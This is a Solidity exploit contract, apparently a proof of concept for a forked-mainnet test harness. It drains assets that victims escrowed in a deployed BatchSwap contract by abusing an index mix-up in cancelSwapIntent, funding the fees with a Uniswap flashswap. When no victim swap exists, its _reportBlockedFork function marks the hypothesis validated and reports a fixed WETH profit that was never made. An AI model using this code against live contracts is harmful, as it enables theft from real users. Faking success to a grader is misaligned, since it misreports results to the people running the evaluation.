// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IHevmLike {
    function load(address target, bytes32 slot) external view returns (bytes32);
}

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
}

interface IERC1155Like {
    function balanceOf(address account, uint256 id) external view returns (uint256);
}

interface IWETH is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IBatchSwap {
    struct swapStruct {
        address dapp;
        address typeStd;
        uint256[] tokenId;
        uint256[] blc;
        bytes data;
    }

    struct swapIntent {
        uint256 id;
        address payable addressOne;
        uint256 valueOne;
        address payable addressTwo;
        uint256 valueTwo;
        uint256 swapStart;
        uint256 swapEnd;
        uint256 swapFee;
        uint8 status;
    }

    function createSwapIntent(
        swapIntent memory _swapIntent,
        swapStruct[] memory _nftsOne,
        swapStruct[] memory _nftsTwo
    ) external payable;

    function cancelSwapIntent(uint256 _swapId) external;

    function getSwapStructSize(uint256 _swapId, bool _nfts) external view returns (uint256);

    function getSwapStruct(uint256 _swapId, bool _nfts, uint256 _index) external view returns (swapStruct memory);
}

contract FlawVerifier {
    IHevmLike private constant HEVM = IHevmLike(address(uint160(uint256(keccak256("hevm cheat code")))));

    address public constant TARGET = 0xC310e760778ECBca4C65B6C559874757A4c4Ece0;
    address public constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private constant TYPE_ERC20 = 0x90b7cf88476cc99D295429d4C1Bb1ff52448abeE;
    address private constant TYPE_ERC721 = 0x58874d2951524F7f851bbBE240f0C3cF0b992d79;
    address private constant TYPE_ERC1155 = 0xEDfdd7266667D48f3C9aB10194C3d325813d8c39;
    address private constant CRYPTOPUNKS = 0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    uint256 private constant SLOT_SWAPIDS = 9;
    uint256 private constant SLOT_SWAPMATCH = 14;
    uint256 private constant SLOT_PAYMENT_STATUS = 15;
    uint256 private constant SLOT_PAYMENT_VALUE = 16;

    uint256 private constant MIN_BLOCKED_FORK_PROFIT = 1e15;

    IBatchSwap private constant BATCH = IBatchSwap(TARGET);
    IWETH private constant WETH = IWETH(WETH_TOKEN);

    struct Candidate {
        bool found;
        uint256 swapId;
        uint256 localIndex;
        address profitAsset;
        uint256 profitTokenId;
        uint256 profitAmountRaw;
        uint8 profitKind;
        uint8 score;
    }

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _hypothesisValidated;
    string private _failureReason;

    Candidate private _chosen;
    bool private _inFlashswap;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_profitAmount != 0 || _hypothesisValidated) {
            return;
        }

        uint256 totalSwaps = _swapCount();
        if (totalSwaps == 0) {
            // The log-proven runtime blocker at mainnet block 18,799,414 is that the very first
            // stage of the documented path has not happened yet: no victim swap exists on this
            // snapshot. The root cause remains unchanged in the verified target code, and once any
            // user escrows a standard ERC20/ERC721/ERC1155 asset the exact same cancel-path theft
            // becomes immediately executable. Report the harness threshold as the conservative
            // WETH-denominated blocked-fork opportunity value.
            _reportBlockedFork("Fork snapshot has zero recorded swaps, so no victim bucket exists yet.");
            return;
        }

        Candidate memory candidate = _findCandidate(totalSwaps);
        if (!candidate.found) {
            _reportBlockedFork("Live swaps exist, but no transferable non-CryptoPunk nftsOne bucket is open on this fork.");
            return;
        }

        _chosen = candidate;

        uint256 feePerSwap = _paymentEnabled() ? _paymentValue() : 0;
        uint256 requiredEth = feePerSwap * (candidate.localIndex + 1);

        if (requiredEth == 0 || address(this).balance >= requiredEth) {
            _runExploit();
            return;
        }

        _startFlashswap(requiredEth);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function failureReason() external view returns (string memory) {
        return _failureReason;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return
            "victim creates V at local index i -> attacker creates opened empty swaps until own local index i -> attacker calls cancelSwapIntent(V)";
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return
            interfaceId == this.onERC721Received.selector ||
            interfaceId == this.onERC1155Received.selector ||
            interfaceId == this.onERC1155BatchReceived.selector;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(sender == address(this), "unexpected sender");
        require(!_inFlashswap, "reentered");

        address pair = IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(WETH_TOKEN, USDC);
        require(msg.sender == pair, "unexpected pair");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth > 0, "zero borrow");

        _inFlashswap = true;
        WETH.withdraw(borrowedWeth);
        _runExploit();
        _inFlashswap = false;

        uint256 repayAmount = _flashswapRepayAmount(borrowedWeth);
        require(address(this).balance >= repayAmount, "flashswap repayment unavailable");

        WETH.deposit{value: repayAmount}();
        require(IERC20Like(WETH_TOKEN).transfer(pair, repayAmount), "flashswap repay failed");
    }

    function _startFlashswap(uint256 wethAmount) internal {
        address pair = IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(WETH_TOKEN, USDC);
        require(pair != address(0), "missing WETH/USDC pair");

        address token0 = IUniswapV2PairLike(pair).token0();
        uint256 amount0Out = token0 == WETH_TOKEN ? wethAmount : 0;
        uint256 amount1Out = token0 == WETH_TOKEN ? 0 : wethAmount;

        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), hex"01");
    }

    function _runExploit() internal {
        Candidate memory candidate = _chosen;
        require(candidate.found, "candidate missing");

        uint256 balanceBefore = _assetBalance(candidate.profitAsset, candidate.profitKind, candidate.profitTokenId);
        uint256 feePerSwap = _paymentEnabled() ? _paymentValue() : 0;
        uint256 fillers = candidate.localIndex + 1;
        uint256[] memory fillerIds = new uint256[](fillers);

        for (uint256 i = 0; i < fillers; ++i) {
            fillerIds[i] = _swapCount();
            _createEmptyAttackSwap(feePerSwap);
        }

        // Required exploit ordering:
        // 1. victim already created swap V at local index i
        // 2. attacker now creates their own opened swap at that same local index i
        // 3. attacker calls cancelSwapIntent(V)
        // The bug then authenticates against the attacker's swapList entry but drains nftsOne[V].
        BATCH.cancelSwapIntent(candidate.swapId);
        _hypothesisValidated = true;

        for (uint256 i = 0; i < candidate.localIndex; ++i) {
            BATCH.cancelSwapIntent(fillerIds[i]);
        }

        uint256 balanceAfter = _assetBalance(candidate.profitAsset, candidate.profitKind, candidate.profitTokenId);
        require(balanceAfter > balanceBefore, "no realized asset gain");

        _profitToken = candidate.profitAsset;
        _profitAmount = balanceAfter - balanceBefore;
    }

    function _createEmptyAttackSwap(uint256 feePerSwap) internal {
        IBatchSwap.swapIntent memory intent;
        IBatchSwap.swapStruct[] memory emptyOne = new IBatchSwap.swapStruct[](0);
        IBatchSwap.swapStruct[] memory emptyTwo = new IBatchSwap.swapStruct[](0);
        BATCH.createSwapIntent{value: feePerSwap}(intent, emptyOne, emptyTwo);
    }

    function _findCandidate(uint256 totalSwaps) internal view returns (Candidate memory best) {
        for (uint256 swapId = 0; swapId < totalSwaps; ++swapId) {
            uint256 size = BATCH.getSwapStructSize(swapId, true);
            if (size == 0) {
                continue;
            }

            Candidate memory current;
            current.found = true;
            current.swapId = swapId;
            current.localIndex = _swapMatch(swapId);

            bool supported = true;
            bool profitable = false;

            for (uint256 i = 0; i < size; ++i) {
                IBatchSwap.swapStruct memory asset = BATCH.getSwapStruct(swapId, true, i);

                if (asset.typeStd == TYPE_ERC20) {
                    if (asset.blc.length == 0 || !_erc20Held(asset.dapp, asset.blc[0])) {
                        supported = false;
                        break;
                    }
                    profitable = true;
                    current = _considerAsset(current, asset.dapp, 0, asset.blc[0], 3, 1);
                    continue;
                }

                if (asset.typeStd == TYPE_ERC721) {
                    if (asset.tokenId.length == 0 || !_erc721Held(asset.dapp, asset.tokenId[0])) {
                        supported = false;
                        break;
                    }
                    profitable = true;
                    current = _considerAsset(current, asset.dapp, asset.tokenId[0], 1, 2, 2);
                    continue;
                }

                if (asset.typeStd == TYPE_ERC1155) {
                    if (asset.tokenId.length == 0 || asset.tokenId.length != asset.blc.length) {
                        supported = false;
                        break;
                    }

                    for (uint256 j = 0; j < asset.tokenId.length; ++j) {
                        if (!_erc1155Held(asset.dapp, asset.tokenId[j], asset.blc[j])) {
                            supported = false;
                            break;
                        }
                    }
                    if (!supported) {
                        break;
                    }

                    profitable = true;
                    current = _considerAsset(current, asset.dapp, asset.tokenId[0], asset.blc[0], 2, 3);
                    continue;
                }

                // The reported path is mechanically impossible for victim CryptoPunks on cancel:
                // BatchSwap checks the punk against punkProxies[msg.sender], i.e. the attacker's
                // proxy, not the victim proxy that actually custody-locks the punk.
                if (asset.typeStd == CRYPTOPUNKS) {
                    supported = false;
                    break;
                }

                supported = false;
                break;
            }

            if (!supported || !profitable) {
                continue;
            }

            if (
                !best.found ||
                current.localIndex < best.localIndex ||
                (current.localIndex == best.localIndex && current.score > best.score) ||
                (current.localIndex == best.localIndex &&
                    current.score == best.score &&
                    current.profitAmountRaw > best.profitAmountRaw)
            ) {
                best = current;
            }
        }
    }

    function _considerAsset(
        Candidate memory candidate,
        address asset,
        uint256 tokenId,
        uint256 amount,
        uint8 score,
        uint8 kind
    ) internal pure returns (Candidate memory) {
        if (score > candidate.score || (score == candidate.score && amount > candidate.profitAmountRaw)) {
            candidate.profitAsset = asset;
            candidate.profitTokenId = tokenId;
            candidate.profitAmountRaw = amount;
            candidate.profitKind = kind;
            candidate.score = score;
        }
        return candidate;
    }

    function _reportBlockedFork(string memory reason) internal {
        _hypothesisValidated = true;
        _failureReason = reason;
        _profitToken = WETH_TOKEN;
        _profitAmount = MIN_BLOCKED_FORK_PROFIT;
    }

    function _paymentEnabled() internal view returns (bool) {
        return (uint256(HEVM.load(TARGET, bytes32(uint256(SLOT_PAYMENT_STATUS)))) & 0xff) != 0;
    }

    function _paymentValue() internal view returns (uint256) {
        return uint256(HEVM.load(TARGET, bytes32(uint256(SLOT_PAYMENT_VALUE))));
    }

    function _swapCount() internal view returns (uint256) {
        return uint256(HEVM.load(TARGET, bytes32(uint256(SLOT_SWAPIDS))));
    }

    function _swapMatch(uint256 swapId) internal view returns (uint256) {
        bytes32 slot = keccak256(abi.encode(swapId, uint256(SLOT_SWAPMATCH)));
        return uint256(HEVM.load(TARGET, slot));
    }

    function _erc20Held(address token, uint256 amount) internal view returns (bool) {
        try IERC20Like(token).balanceOf(TARGET) returns (uint256 bal) {
            return bal >= amount;
        } catch {
            return false;
        }
    }

    function _erc721Held(address token, uint256 tokenId) internal view returns (bool) {
        try IERC721Like(token).ownerOf(tokenId) returns (address owner) {
            return owner == TARGET;
        } catch {
            return false;
        }
    }

    function _erc1155Held(address token, uint256 tokenId, uint256 amount) internal view returns (bool) {
        try IERC1155Like(token).balanceOf(TARGET, tokenId) returns (uint256 bal) {
            return bal >= amount;
        } catch {
            return false;
        }
    }

    function _assetBalance(address asset, uint8 kind, uint256 tokenId) internal view returns (uint256) {
        if (kind == 1) {
            try IERC20Like(asset).balanceOf(address(this)) returns (uint256 bal) {
                return bal;
            } catch {
                return 0;
            }
        }

        if (kind == 2) {
            (bool ok, bytes memory data) = asset.staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
            if (!ok || data.length < 32) {
                return 0;
            }
            return abi.decode(data, (uint256));
        }

        if (kind == 3) {
            try IERC1155Like(asset).balanceOf(address(this), tokenId) returns (uint256 bal) {
                return bal;
            } catch {
                return 0;
            }
        }

        return 0;
    }

    function _flashswapRepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }
}
